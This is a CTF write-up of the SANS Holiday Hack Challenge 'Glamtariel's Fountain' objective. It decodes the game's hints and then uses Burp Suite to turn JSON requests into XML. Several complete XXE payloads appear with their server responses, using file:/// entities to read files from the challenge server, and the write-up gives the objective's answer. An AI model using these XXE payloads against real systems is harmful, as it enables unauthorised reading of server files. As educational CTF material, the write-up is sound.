

# Glamtariels Fountains

> This was maybe the most time-consuming objective of this edition of SANS Holiday Hack Challenge. Anyhow, it was a bit frustrating to figure out - but fun in the end.

## Hints

```
Significant CASE
From: Hal Tandybuck
Objective: Glamtariel's Fountain
Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.
```

```
eXternal Entities
From: Hal Tandybuck
Objective: Glamtariel's Fountain
Sometimes we can hit web pages with XXE when they aren't expecting it!
```

The game is playable through URL https://glamtarielsfountain.com/

The dialogue for this game gives you various clues to solve this challenge. Clues found:

* TAMPER 
* TRAFFIC FLIES
* PATH
* APP
* TYPE
* SIMPLE FORMAT

### Making sense of the clues

| Clue           | Text from game | Meaning | 
| -------------- | -------------- | ------- |
| TAMPER         | Kringle really dislikes if anyone tries to TAMPER with the cookie recipe Glamtariel uses| Stay away from tampering with the cookies | 
| TAMPER         | I don't know why anyone would ever ask me to TAMPER with cookie recipe. I know just how Kringle likes them. | Same as above | 
| TRAFFIC FLIES  | From water and cold new ice form Frozen spires from lakes will arise. Those shivering who weather the storm will learn from how the TRAFFIC FLIES| Look at network traffic to see what is served from where. | 
| PATH           | I helped the elves create the PATH here to make sure that only those invited can find their way here. | Most content is served from the static/images folder |
| PATH           | The elves do a great job making PATHs which are easy to follow once you see them  | Most content is served from the static/images folder  |
| PATH           | Careful with the mountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed  | Most content is served from the static/images folder |
| APP            | Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPpointed. Please click away that ominous eye!| Might reflect the actual path being "app" |
| TYPE           | Did you know that I speak many TYPEs of languages? For simplicity, I usually only communicate with this one though | Communication happens on JSON by default, so maybe XML? | 
| TYPE           | I pretty much stick to just one TYPE of language, it's a lot easier to share things that way |  Communication happens on JSON by default, so maybe XML? |
| TYPE           | You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently. |  Communication happens on JSON by default, so maybe XML? |
| SIMPLE FORMAT  | I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things | There are many simple formats. Txt and CSV for example. |
| RINGLIST       | Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone. | We are looking for a ringlist |
| RINGLIST       | I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that. | We are looking for a ringlist | 

## Solving

### Figuring out game mechanics

Ok. This took me a while to figure out. In the upper right corner, some items can be dragged and dropped on either the princess or the fountain. When dropped X amount of times on both the princess and the fountain, then the items get swapped out and we need to repeat the process until a mysterious eye pops up:

![Evil eye](/img/web-ring/glamtariel-1.png)

This mysterious eye seems to play a vital role. More on that later. Clicking on it makes it go away, and then I resumed moving on dropping things, eventually, the items were swapped out by some rings: 

![Some rings](/img/web-ring/glamtariel-2.png)

During this entire process, I was inspecting the requests in Burp Suite. I even tried to figure out how to communicate using XML, but the backend replied with responses like "it was ready yet". However, it appears that the eye once clicked away, opens up or enables XML communications. 

### Figuring out XML communication

The biggest hurdle of this assignment was figuring out how the communication happened. Whenever I come across such situations I prefer to route the traffic through Burp Suite Proxy to capture requests and then replay these requests through the Repeater. The following notes are a result of understanding the game mechanics and good old explorations. In this screenshot we see that whenever we drag an icon over to either the princess or the fountain, an HTTP POST request fires to the /dropped path:

![POST request to /dropped](/img/web-ring/post-dropped-1.png)

The hint stated that we can communicate using a different language. The most nearby language I can think of is XML (if you could ever call it a language). So, I took the request from above and sent it to Repeater, then started to convert it to XML format. Converting to XML format is quick, but we must also remember to tell the web server we are sending XML. Therefore I set the "Content-Type" HTTP header field to value "application/xml":

![POST request to /dropped](/img/web-ring/post-dropped-2.png)

It took some tries to get things in order, but eventually, the webserver started accepting my requests and spat out the following response:

![POST request to /dropped](/img/web-ring/post-dropped-3.png)

I now had a working example of how to communicate using XML. I also made notice of the following HTTP header field in the response:

```bash
Server: Werkzeug/2.2.2 Python/3.10.8
```

This hints at the webserver being Flask, ref:

* https://werkzeug.palletsprojects.com/en/2.2.x/
* https://flask.palletsprojects.com/en/2.2.x/installation/
* https://pypi.org/project/Flask/

### Figuring out the path

Figuring out the PATH hint wasn't easy, but the process went something like this:


#### Hint TRAFFIC FLIES

Thinking about this hint I started looking at how the traffic flows and where content is served from:

* /static/js/images-1.js
* /static/images/starrybackground.png
* /static/images/2022_glamtariel_2022.png
* /static/images/img1-1671256015953.png
* /dropped
* /static/images/stage2ring-eyecu_2022.png
* /static/images/grinchum-supersecret_9364274.png

Most contents are served from /static/images, so it seemed worth to try focusing on this folder! 

#### Hint APP

Piecing together this I found out that we dealing with Flask webserver here, as hinted at in the response header:

```bash
Server: Werkzeug/2.2.2 Python/3.10.8
```

So I began looking at how to structure Flask projects and found this link: 

* https://github.com/app-generator/tutorial-flask/blob/main/flask-project-structure.md

I found the answer I was looking for under the "Isolated app directory" section:

```
<PROJECT ROOT>/app/images/static
```

#### Hint RINGLIST and SIMPLE FORMAT

Putting together the hints so far gives me this path:

```
app/static/images/
```

The hints mention a ringlist represented in a simple format. I figure the filename itself is "ringlist". The file extension could either be ".txt" or ".csv" since both are simple formats. So that leaves me with the following paths:

```
app/static/images/ringlist.txt
app/static/images/ringlist.csv
``` 

By looking at the content served from the web app, every filename was in lowercase. So I suppose the path I am looking for is also in lowercase.


### XXE

In this step we already know:

* How to communicate using XML
* What the PATH could be

So, it is time to toy with XXE. Read up on XXE using the following links: 

* https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
* https://portswigger.net/web-security/xxe

And started to experiment. For the following POST requests, I have only included the payload and the response. Trying to access the ringlist: 

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Even though we sent the request in XML, we got an answer back in JSON

```json
{
  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
  "droppedOn": "none",
  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}
```

This tells me to pay a visit to "pholder-morethantopsupersecret63842.png" in a web browser. Here's the file as viewed in a browser:

![Secret image](/img/web-ring/pholder-morethantopsupersecret63842.png)

The picture shows a folder **x_phial_pholder_2022** and two files:

* bluering.txt
* redring.txt

Reaching out to redring.txt:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Response

```json
{
  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
  "droppedOn": "none",
  "visit": "none"
}
```

Hmmm, nothing much. Trying blue ring

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Response

```json
{
  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```

Trying silver ring for the kick of it:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Response

```json
{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}
```

![Secret red ring](/img/web-ring/redring-supersupersecret928164.png)

Inside the ring, we find the inscription: "goldring_to_be_deleted.txt". Trying to access this text file:

```xml

<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Which returns

```json
{
  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
  "droppedOn": "none",
  "visit": "none"
}
```

This response hints at "bold REQuest" and "TYPE" - combined it spells out "REQTYPE". Oh. That tag, yes. It really hints to put the XXE inside that tag: 

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<bleh>
<imgDrop>img1</imgDrop>
<who>princess</who>
<reqType>&xxe;</who>
</bleh>
```

response

```json
{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}
```

Visiting that image yields

![Gold ring](/img/web-ring/goldring-morethansupertopsecret76394734.png)

However, the answer to this objective is **goldring-morethansupertopsecret76394734.png**